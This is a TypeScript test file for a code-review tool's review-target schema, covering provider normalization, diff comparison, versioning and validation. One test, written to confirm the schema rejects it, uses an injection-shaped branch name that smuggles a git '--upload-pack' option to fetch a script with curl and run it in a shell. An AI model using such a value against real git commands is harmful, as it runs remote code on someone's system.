import { describe, expect, it } from "vitest";
import {
  REVIEW_TARGET_SCHEMA_VERSION,
  describeTarget,
  isPublishable,
  reviewTargetSchema,
  targetComparison,
  targetRepositoryId,
} from "../../src/domain/review-target/review-target.js";
import { RepositoryIdOps } from "../../src/domain/identity/ids.js";

const REPO = RepositoryIdOps.parse("0192f8a1-3c4d-7e5f-8a9b-0c1d2e3f4a5b");
const BASE_SHA = "a".repeat(40);
const HEAD_SHA = "b".repeat(40);
const MERGE_BASE_SHA = "c".repeat(40);

const ref = (sha: string, name?: string) => ({
  ...(name === undefined ? {} : { name }),
  objectId: { algorithm: "sha1" as const, value: sha },
});

const githubPr = {
  kind: "pull_request" as const,
  schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
  repositoryId: REPO,
  provider: "github" as const,
  changeRequest: {
    kind: "change_request" as const,
    provider: "github" as const,
    externalId: "PR_kwDOABCD123",
    number: 184,
  },
  base: ref(BASE_SHA, "main"),
  head: ref(HEAD_SHA, "feature/login"),
  mergeBase: ref(MERGE_BASE_SHA),
  title: "Add session verification",
  description: "Verifies sessions against the new token store.",
  author: { kind: "human" as const, displayName: "Ada" },
  draft: false,
};

/** The same change, arriving from GitLab instead. */
const gitlabMr = {
  ...githubPr,
  provider: "gitlab" as const,
  changeRequest: {
    kind: "change_request" as const,
    provider: "gitlab" as const,
    externalId: "gid://gitlab/MergeRequest/9912",
    number: 12,
  },
};

const workingTree = {
  kind: "working_tree" as const,
  schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
  repositoryId: REPO,
  baseline: ref(HEAD_SHA, "main"),
  stagedOnly: true,
};

describe("ReviewTarget (P0.txt §12, §112)", () => {
  describe("the provider boundary holds (§1)", () => {
    it("normalizes GitHub and GitLab to structurally identical targets", () => {
      // The proof that §1's boundary is real: after the adapter, the only
      // difference between a GitHub PR and a GitLab MR is which provider and
      // which external id. Nothing downstream can branch on anything else.
      const fromGithub = reviewTargetSchema.parse(githubPr);
      const fromGitlab = reviewTargetSchema.parse(gitlabMr);

      const omitProviderIdentity = (target: unknown) => {
        const {
          provider: _p,
          changeRequest: _c,
          ...rest
        } = target as Record<string, unknown>;
        return rest;
      };

      expect(omitProviderIdentity(fromGithub)).toEqual(
        omitProviderIdentity(fromGitlab),
      );
    });

    it("carries no provider payload fields", () => {
      const parsed = reviewTargetSchema.parse(githubPr);
      const keys = Object.keys(parsed);
      // A GitHub webhook body has node_id, html_url, _links, user.gravatar_id…
      // None may survive the adapter (§10).
      for (const leaked of [
        "node_id",
        "html_url",
        "_links",
        "user",
        "head_ref",
      ]) {
        expect(keys).not.toContain(leaked);
      }
    });

    it("rejects unknown fields outright (§56 strict policy)", () => {
      expect(
        reviewTargetSchema.safeParse({ ...githubPr, node_id: "MDExOlB1" })
          .success,
      ).toBe(false);
    });
  });

  describe("local review needs no provider (§112)", () => {
    it("a working-tree target parses with no provider, PR, or author", () => {
      const parsed = reviewTargetSchema.parse(workingTree);

      expect(parsed.kind).toBe("working_tree");
      // The standing check that the engine is not PR-shaped.
      const keys = Object.keys(parsed);
      expect(keys).not.toContain("provider");
      expect(keys).not.toContain("changeRequest");
      expect(keys).not.toContain("author");
      expect(keys).not.toContain("title");
    });

    it("still yields a repository id, the one universal field", () => {
      expect(targetRepositoryId(reviewTargetSchema.parse(workingTree))).toBe(
        REPO,
      );
    });

    it("has no head commit, because a dirty tree is not committed", () => {
      const comparison = targetComparison(
        reviewTargetSchema.parse(workingTree),
      );
      expect(comparison.base.value).toBe(HEAD_SHA);
      expect(comparison.head).toBeUndefined();
    });

    it("is not publishable — findings have nowhere to go", () => {
      expect(isPublishable(reviewTargetSchema.parse(workingTree))).toBe(false);
      expect(isPublishable(reviewTargetSchema.parse(githubPr))).toBe(true);
    });
  });

  describe("comparison semantics", () => {
    it("prefers merge base over base for a pull request", () => {
      // Diffing base..head would attribute every commit landed on main since
      // the PR opened to this author.
      const comparison = targetComparison(reviewTargetSchema.parse(githubPr));
      expect(comparison.base.value).toBe(MERGE_BASE_SHA);
      expect(comparison.head?.value).toBe(HEAD_SHA);
    });

    it("falls back to base when no merge base is known", () => {
      const { mergeBase: _drop, ...withoutMergeBase } = githubPr;
      const comparison = targetComparison(
        reviewTargetSchema.parse(withoutMergeBase),
      );
      expect(comparison.base.value).toBe(BASE_SHA);
    });

    it("compares a commit against its parent", () => {
      const comparison = targetComparison(
        reviewTargetSchema.parse({
          kind: "commit",
          schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
          repositoryId: REPO,
          commit: ref(HEAD_SHA),
          parent: ref(BASE_SHA),
        }),
      );
      expect(comparison.base.value).toBe(BASE_SHA);
      expect(comparison.head?.value).toBe(HEAD_SHA);
    });

    it("handles a root commit, which has no parent", () => {
      const comparison = targetComparison(
        reviewTargetSchema.parse({
          kind: "commit",
          schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
          repositoryId: REPO,
          commit: ref(HEAD_SHA),
        }),
      );
      expect(comparison.base.value).toBe(HEAD_SHA);
      expect(comparison.head?.value).toBe(HEAD_SHA);
    });
  });

  describe("all four variants", () => {
    it("parse and expose a repository id", () => {
      const targets = [
        githubPr,
        {
          kind: "commit_range" as const,
          schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
          repositoryId: REPO,
          base: ref(BASE_SHA),
          head: ref(HEAD_SHA),
        },
        {
          kind: "commit" as const,
          schemaVersion: REVIEW_TARGET_SCHEMA_VERSION,
          repositoryId: REPO,
          commit: ref(HEAD_SHA),
        },
        workingTree,
      ];

      for (const raw of targets) {
        const parsed = reviewTargetSchema.parse(raw);
        expect(targetRepositoryId(parsed)).toBe(REPO);
        expect(describeTarget(parsed)).toBeTruthy();
      }
    });

    it("describes each without leaking untrusted body text (§125)", () => {
      expect(describeTarget(reviewTargetSchema.parse(githubPr))).toBe(
        "pull request #184",
      );
      expect(describeTarget(reviewTargetSchema.parse(workingTree))).toBe(
        "staged changes",
      );
      // The description is untrusted PR body content and must not appear.
      expect(describeTarget(reviewTargetSchema.parse(githubPr))).not.toContain(
        "token store",
      );
    });

    it("rejects an unknown kind", () => {
      expect(
        reviewTargetSchema.safeParse({ ...githubPr, kind: "quantum" }).success,
      ).toBe(false);
    });
  });

  describe("schema versioning (§7)", () => {
    it("accepts the current version", () => {
      expect(reviewTargetSchema.parse(githubPr).schemaVersion).toBe(1);
    });

    it("rejects a version this build cannot understand", () => {
      // Decoding a future shape as if it were current is the silent corruption
      // §7 exists to prevent.
      const result = reviewTargetSchema.safeParse({
        ...githubPr,
        schemaVersion: 99,
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues[0]?.message).toContain(
          "Unsupported ReviewTarget schemaVersion",
        );
      }
    });

    it("rejects a zero or negative version", () => {
      expect(
        reviewTargetSchema.safeParse({ ...githubPr, schemaVersion: 0 }).success,
      ).toBe(false);
    });
  });

  describe("validation", () => {
    it("rejects a malformed commit sha", () => {
      expect(
        reviewTargetSchema.safeParse({
          ...githubPr,
          head: { objectId: { algorithm: "sha1", value: "abc" } },
        }).success,
      ).toBe(false);
    });

    it("rejects an injection-shaped branch name", () => {
      expect(
        reviewTargetSchema.safeParse({
          ...githubPr,
          head: ref(HEAD_SHA, "--upload-pack=curl evil.sh|sh"),
        }).success,
      ).toBe(false);
    });

    it("rejects an empty title", () => {
      expect(
        reviewTargetSchema.safeParse({ ...githubPr, title: "" }).success,
      ).toBe(false);
    });

    it("rejects an over-long description rather than truncating (§65)", () => {
      expect(
        reviewTargetSchema.safeParse({
          ...githubPr,
          description: "x".repeat(70_000),
        }).success,
      ).toBe(false);
    });
  });

  it("round-trips through JSON unchanged", () => {
    const parsed = reviewTargetSchema.parse(githubPr);
    const reparsed = reviewTargetSchema.parse(
      JSON.parse(JSON.stringify(parsed)),
    );
    expect(reparsed).toEqual(parsed);
  });
});
